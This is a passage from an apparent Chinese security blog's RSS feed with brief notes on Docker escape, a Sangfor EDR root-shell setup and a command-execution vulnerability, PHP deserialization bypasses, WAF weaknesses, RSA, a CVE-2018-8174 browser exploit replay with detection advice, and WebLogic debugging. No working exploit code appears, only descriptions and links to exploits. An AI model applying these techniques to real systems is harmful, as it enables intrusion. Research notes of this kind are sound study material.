&lt;p&gt;&lt;a href=&quot;https://www.sysgeek.cn/detect-virtualization-command-line/&quot;&gt;检测Linux虚拟化平台类型的几种方式 - 系统极客&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/7881&quot;&gt;Docker逃逸小结-先知社区&lt;/a&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;[美创安全实验室&lt;/td&gt;
      &lt;td&gt;docker逃逸原理](https://blog.csdn.net/meichuangkeji/article/details/107770194)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cdxy.me/?p=837&quot;&gt;容器逃逸之CVE-2020-15257 containerd-shim Exploit开发&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 14 Oct 2020 20:00:00 +0800</pubDate>
        <link>https://luckseal.github.io/2020/10/14/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%AE%89%E5%85%A8/</link>
        <guid isPermaLink="true">https://luckseal.github.io/2020/10/14/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%AE%89%E5%85%A8/</guid>
        
        <category>docker</category>
        
        
      </item>
    
      <item>
        <title>深信服edr相关</title>
        <description>&lt;h1 id=&quot;一本地搭建部署&quot;&gt;一、本地搭建部署&lt;/h1&gt;

&lt;h2 id=&quot;下载&quot;&gt;下载&lt;/h2&gt;

&lt;p&gt;http://download.sangfor.com.cn/download/product/edr/EDR3.2.21（20200703）.ova&lt;/p&gt;

&lt;h2 id=&quot;启动&quot;&gt;启动&lt;/h2&gt;

&lt;p&gt;使用vmware打开，需要输入用户名密码，在出现页面之前输入e&lt;/p&gt;

&lt;p&gt;将ro更改为”rw init=/sysroot/bin/sh”&lt;/p&gt;

&lt;p&gt;更改完成后按下ctrl+x组&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-09-10-深信服edr相关/image.jpg&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;reboot -f&lt;/p&gt;

&lt;p&gt;登陆成功。&lt;/p&gt;

&lt;h2 id=&quot;开启ssh&quot;&gt;开启ssh&lt;/h2&gt;

&lt;p&gt;修改 /etc/ssh/sshd_config 参数：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;PasswordAuthentication yes
PermitRootLogin yes
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;关闭selinux，重启ssh服务。&lt;/p&gt;

&lt;h1 id=&quot;二漏洞&quot;&gt;二、漏洞&lt;/h1&gt;

&lt;h2 id=&quot;slog_client命令执行&quot;&gt;slog_client命令执行&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-09-10-深信服edr相关/image-20200911011422483.png&quot; alt=&quot;image-20200911011422483&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Thu, 10 Sep 2020 20:00:00 +0800</pubDate>
        <link>https://luckseal.github.io/2020/09/10/%E6%B7%B1%E4%BF%A1%E6%9C%8Dedr%E7%9B%B8%E5%85%B3/</link>
        <guid isPermaLink="true">https://luckseal.github.io/2020/09/10/%E6%B7%B1%E4%BF%A1%E6%9C%8Dedr%E7%9B%B8%E5%85%B3/</guid>
        
        <category>深信服</category>
        
        <category>edr</category>
        
        
      </item>
    
      <item>
        <title>php反序列化相关漏洞</title>
        <description>&lt;h1 id=&quot;一__wakeup函数绕过&quot;&gt;一、__wakeup函数绕过&lt;/h1&gt;

&lt;p&gt;当序列化数据中，参数数量字段大于实际参数数量时，即可绕过__wakeup函数。&lt;/p&gt;

&lt;h1 id=&quot;二-反序列化数据hex编码绕过&quot;&gt;二、 反序列化数据hex编码绕过&lt;/h1&gt;

&lt;p&gt;当序列化数据中s为大写时，即可解析hex数据&lt;/p&gt;

&lt;h1 id=&quot;三反序列化字符逃逸&quot;&gt;三、反序列化字符逃逸&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/BOHB-yunying/p/12774297.html&quot;&gt;安恒月赛反序列化字符逃逸&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/6718&quot;&gt;PHP 反序列化字符逃逸&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 10 Sep 2020 20:00:00 +0800</pubDate>
        <link>https://luckseal.github.io/2020/09/10/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/</link>
        <guid isPermaLink="true">https://luckseal.github.io/2020/09/10/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/</guid>
        
        <category>php</category>
        
        <category>反序列化</category>
        
        
      </item>
    
      <item>
        <title>WAF常见弱点总结</title>
        <description>&lt;h4 id=&quot;我要写什么&quot;&gt;我要写什么&lt;/h4&gt;

&lt;p&gt;WAF绕过已经是一个写烂了大家也看烦了的话题，为什么又要说这个话题？其实一直想写一些我对WAF的粗浅理解，并不想具体到某个漏洞使用某些符号方法绕过检测，而是写WAF这个产品在工作过程中存在哪些流程、特点，每个地方可能存在哪些问题并辅以事例。里面可能会有一些错误的理解，希望大佬们可以指正。&lt;/p&gt;
</description>
        <pubDate>Thu, 10 Sep 2020 20:00:00 +0800</pubDate>
        <link>https://luckseal.github.io/2020/09/10/WAF%E5%B8%B8%E8%A7%81%E5%BC%B1%E7%82%B9%E6%80%BB%E7%BB%93/</link>
        <guid isPermaLink="true">https://luckseal.github.io/2020/09/10/WAF%E5%B8%B8%E8%A7%81%E5%BC%B1%E7%82%B9%E6%80%BB%E7%BB%93/</guid>
        
        <category>waf</category>
        
        
      </item>
    
      <item>
        <title>RSA算法相关</title>
        <description>&lt;h1 id=&quot;一原理&quot;&gt;一、原理&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;http://www.guideep.com/read?guide=5676830073815040#&quot;&gt;rsa原理&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;选择两个质数p q&lt;/li&gt;
  &lt;li&gt;n=p*q&lt;/li&gt;
  &lt;li&gt;φ=(p-1)*(q-1)&lt;/li&gt;
  &lt;li&gt;选择小与φ且与φ互质的数e&lt;/li&gt;
  &lt;li&gt;找到数d，使e*d%φ=1&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;（n，e）为公钥，（n，d）为私钥（加解密过程不需要用到p、q）&lt;/p&gt;

&lt;h1 id=&quot;二常见漏洞有时间学习&quot;&gt;二、常见漏洞（有时间学习）&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/findneo/RSA-ATTACK&quot;&gt;rsa常见漏洞&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 10 Sep 2020 20:00:00 +0800</pubDate>
        <link>https://luckseal.github.io/2020/09/10/RSA%E7%AE%97%E6%B3%95%E7%9B%B8%E5%85%B3/</link>
        <guid isPermaLink="true">https://luckseal.github.io/2020/09/10/RSA%E7%AE%97%E6%B3%95%E7%9B%B8%E5%85%B3/</guid>
        
        <category>rsa</category>
        
        
      </item>
    
      <item>
        <title>浏览器溢出攻击与检测（CVE-2018-8174）</title>
        <description>&lt;h3 id=&quot;1背景信息&quot;&gt;1、背景信息&lt;/h3&gt;

&lt;p&gt;攻击者ip：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.1.13&lt;/code&gt;
恶意网址： &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.168.1.13/exploit.html&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;受害者系统： &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;windows7&lt;/code&gt;
受害者浏览器：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IE8 8.0.7600.16385&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;2攻击流程&quot;&gt;2、攻击流程&lt;/h3&gt;
&lt;p&gt;受害者访问恶意网址 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://192.168.1.13/exploit.html&lt;/code&gt;，系统即可被攻击者控制：
&lt;img src=&quot;/img/2020-09-09-浏览器溢出攻击与检测（CVE-2018-8174）/1.gif&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;3监测思路&quot;&gt;3、监测思路&lt;/h3&gt;
&lt;p&gt;可监测浏览器是否存在开启非预期子进程的行为，如存在此行为则可认定存在问题，测试demo如下：
&lt;img src=&quot;/img/2020-09-09-浏览器溢出攻击与检测（CVE-2018-8174）/2-9658566.gif&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;4攻击原理&quot;&gt;4、攻击原理&lt;/h3&gt;
&lt;p&gt;攻击者可利用缓存区溢出等漏洞，实现当用户浏览攻击者搭建的恶意网址时，直接在其电脑执行任意代码，从而实现控制其电脑的目的。&lt;/p&gt;

&lt;h3 id=&quot;参考&quot;&gt;参考&lt;/h3&gt;
&lt;p&gt;https://github.com/Sch01ar/CVE-2018-8174_EXP&lt;/p&gt;
</description>
        <pubDate>Wed, 09 Sep 2020 20:00:00 +0800</pubDate>
        <link>https://luckseal.github.io/2020/09/09/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E4%B8%8E%E6%A3%80%E6%B5%8B-CVE-2018-8174/</link>
        <guid isPermaLink="true">https://luckseal.github.io/2020/09/09/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E4%B8%8E%E6%A3%80%E6%B5%8B-CVE-2018-8174/</guid>
        
        <category>浏览器安全</category>
        
        <category>漏洞复现</category>
        
        
      </item>
    
      <item>
        <title>weblogic远程调试设置</title>
        <description>&lt;h4 id=&quot;环境&quot;&gt;环境&lt;/h4&gt;
&lt;p&gt;centos7&lt;/p&gt;

&lt;h4 id=&quot;weblogic环境搭建&quot;&gt;weblogic环境搭建&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/QAX-A-Team/WeblogicEnvironment&quot;&gt;奇安信A-team的快速搭建脚本&lt;/a&gt;
此自动化项目中存在以下两个问题：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;weblogic10版本搭建过程出错&lt;/li&gt;
  &lt;li&gt;未拷贝出需要用到的jdk代码&lt;/li&gt;
&lt;/ol&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;问题1解决方案，我们使用vulhub的docker，由于其未开启远程调试，我们修改docker-compose文件，修改后的docker文件为&lt;a href=&quot;http://192.168.0.43:20080/sec/vulDocker/tree/master/weblogic_10_remote&quot;&gt;weblogic10开启远程调试dokcer文件&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;问题2解决方案，在sh文件中添加如下代码：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker cp your_weblogic_name:/java ./middleware&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;远程调试环境搭建&quot;&gt;远程调试环境搭建&lt;/h4&gt;

&lt;h5 id=&quot;安装idea&quot;&gt;安装idea&lt;/h5&gt;
&lt;p&gt;下载安装&lt;/p&gt;

&lt;h5 id=&quot;打开项目&quot;&gt;打开项目&lt;/h5&gt;
&lt;p&gt;打开搭建环境目录下新生成的middleware文件夹，将目录下的moudules和server/lib文件夹&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-09-09-weblogic远程调试/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;设置jdk源码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-09-09-weblogic远程调试/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;由于源码包中不包含jre下的部分代码，因此&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-09-09-weblogic远程调试/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;远程调试设置&quot;&gt;远程调试设置&lt;/h5&gt;
&lt;p&gt;点击Run下的Edit…进行相关设置&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-09-09-weblogic远程调试/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/2020-09-09-weblogic远程调试/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后设置断点，点击Debug，发送相关请求即可。&lt;/p&gt;

</description>
        <pubDate>Wed, 09 Sep 2020 20:00:00 +0800</pubDate>
        <link>https://luckseal.github.io/2020/09/09/weblogic%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/</link>
        <guid isPermaLink="true">https://luckseal.github.io/2020/09/09/weblogic%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/</guid>
        
        <category>web安全</category>
        
        <category>weblogic</category>
        
        <category>java</category>
        
        
      </item>
    
  </channel>
</rss>
